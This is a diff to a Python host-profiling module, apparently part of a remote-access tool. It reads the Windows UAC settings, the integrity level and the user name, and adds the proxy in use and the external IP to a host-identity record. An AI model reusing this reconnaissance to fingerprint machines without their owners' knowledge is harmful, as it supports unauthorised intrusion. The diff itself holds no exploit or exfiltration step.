@@ -190,7 +190,7 @@ def getUACLevel():
     i, consentPromptBehaviorAdmin, enableLUA, promptOnSecureDesktop = 0, None, None, None
     try:
         Registry = ConnectRegistry(None, HKEY_LOCAL_MACHINE)
-        RawKey = OpenKey(Registry, "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System")
+        RawKey = OpenKey(Registry, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')
     except:
         return "?"
     while True:
@@ -219,20 +219,23 @@ def getUACLevel():
 
 def GetUserName():
     from ctypes import windll, WinError, create_unicode_buffer, byref, c_uint32, GetLastError
+
     DWORD = c_uint32
     nSize = DWORD(0)
-    windll.advapi32.GetUserNameW(None, byref(nSize))
+    windll.secur32.GetUserNameExW(2, None, byref(nSize))
     error = GetLastError()
-
     ERROR_INSUFFICIENT_BUFFER = 122
-    if error != ERROR_INSUFFICIENT_BUFFER:
+    ERROR_MORE_DATA_AVAILABLE = 234
+
+    if error not in (ERROR_INSUFFICIENT_BUFFER, ERROR_MORE_DATA_AVAILABLE):
         raise WinError(error)
 
     lpBuffer = create_unicode_buffer('', nSize.value + 1)
+    nSize = DWORD(nSize.value + 1)
+    success = windll.secur32.GetUserNameExW(2, lpBuffer, byref(nSize))
 
-    success = windll.advapi32.GetUserNameW(lpBuffer, byref(nSize))
     if not success:
-        raise WinError()
+        raise WinError(GetLastError())
 
     return lpBuffer.value
 
@@ -266,6 +269,10 @@ def get_uuid():
         hostname = platform.node().decode(
             encoding=os_encoding
         ).encode("utf8")
+
+        if sys.platform == 'win32' and user.startswith(hostname + '\\'):
+            user = user.split('\\', 1)[1]
+
     except Exception:
         pass
 
@@ -356,6 +363,25 @@ def get_uuid():
     except:
         cid = None
 
+    proxy = None
+    try:
+        from network.lib.proxies import LAST_PROXY
+        if LAST_PROXY:
+            proxy = tuple([
+                x for x in LAST_PROXY if x
+            ])
+    except ImportError:
+        proxy = None
+
+    try:
+        external_ip = None
+
+        from network.lib.online import LAST_EXTERNAL_IP
+        if LAST_EXTERNAL_IP:
+            external_ip = str(LAST_EXTERNAL_IP)
+    except ImportError:
+        external_ip = None
+
     return {
         'user': user,
         'hostname': hostname,
@@ -373,4 +399,6 @@ def get_uuid():
         'uac_lvl': uacLevel,
         'intgty_lvl': integrity_level,
         'cid': cid,
+        'proxy': proxy,
+        'external_ip': external_ip
     }
